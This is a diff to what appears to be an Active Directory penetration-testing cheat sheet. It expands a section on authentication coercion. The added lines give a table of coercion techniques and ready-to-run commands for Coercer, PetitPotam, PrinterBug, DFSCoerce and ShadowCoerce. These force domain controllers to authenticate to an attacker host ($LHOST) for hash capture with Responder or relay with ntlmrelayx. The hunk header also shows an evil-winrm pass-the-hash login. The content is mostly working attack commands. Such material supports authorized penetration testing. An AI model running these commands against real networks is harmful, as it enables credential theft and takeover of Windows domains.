@@ -170,17 +170,31 @@ evil-winrm -i $DC_IP -u Administrator -H <NT_HASH>
 
 Force a machine (especially DCs) to authenticate to you for relay or hash capture.
 
+| Method | Protocol | Auth Required | Notes |
+|---|---|---|---|
+| Coercer | Multiple | Yes | Tries all methods automatically — best first choice |
+| PetitPotam | MS-EFSRPC | No (older DCs) | Patched in recent Windows; still works on many |
+| PrinterBug | MS-RPRN | Yes | Requires print spooler running on target |
+| DFSCoerce | MS-DFSNM | Yes | Useful when EFSRPC/RPRN are patched |
+| ShadowCoerce | MS-FSRVP | Yes | Shadow copy coercion |
+
 ```bash
+# Coercer — best first choice, tries all available methods
+coercer coerce -t $DC_IP -l $LHOST -u user -p 'password' -d $DOMAIN
+coercer scan -t $DC_IP -u user -p 'password' -d $DOMAIN    # check what's available
+
 # PetitPotam (MS-EFSRPC) — unauthenticated on older/unpatched DCs
 python3 PetitPotam.py $LHOST $DC_IP
 python3 PetitPotam.py -u '' -p '' $LHOST $DC_IP
 
-# Coercer — tries all available coercion methods (requires creds)
-coercer coerce -t $DC_IP -l $LHOST -u user -p 'password' -d $DOMAIN
-coercer scan -t $DC_IP -u user -p 'password' -d $DOMAIN    # just check what's available
-
-# PrinterBug / SpoolSample (MS-RPRN — requires print spooler on target)
+# PrinterBug / SpoolSample (MS-RPRN)
 python3 printerbug.py $DOMAIN/user:'password'@$DC_IP $LHOST
+
+# DFSCoerce (MS-DFSNM) — when EFSRPC and RPRN are patched
+python3 dfscoerce.py -u user -p 'password' -d $DOMAIN $LHOST $DC_IP
+
+# ShadowCoerce (MS-FSRVP)
+python3 shadowcoerce.py -u user -p 'password' -d $DOMAIN $LHOST $DC_IP
 
 # Combine with Responder (capture NTLMv2) or ntlmrelayx (relay to SMB/LDAP/ADCS)
 responder -I eth0 -wd   # capture mode
